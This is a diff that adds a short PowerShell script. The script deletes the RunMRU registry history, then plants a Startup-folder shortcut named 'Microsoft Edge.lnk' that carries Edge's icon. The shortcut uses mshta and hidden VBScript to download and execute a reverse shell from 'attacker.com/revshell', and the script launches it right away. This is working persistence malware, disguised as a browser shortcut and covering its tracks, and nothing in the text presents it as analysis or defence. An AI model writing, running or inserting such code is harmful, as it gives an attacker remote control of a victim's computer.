@@ -1,0 +1,11 @@
+cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\;
+Remove-Item .\RunMRU\;
+$s=New-Object -ComObject WScript.Shell;
+$l=[System.Environment]::GetFolderPath('Startup');
+$t=(join-path $l 'Microsoft Edge.lnk');
+$x=$s.CreateShortcut($t);
+$x.TargetPath=('mshta.exe');
+$x.Arguments='vbscript:(CreateObject("WScript.Shell").Run("powershell iex(iwr attacker.com/revshell).content",0))(Window.Close)';
+$x.IconLocation='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe';
+$x.Save();
+ii $t;
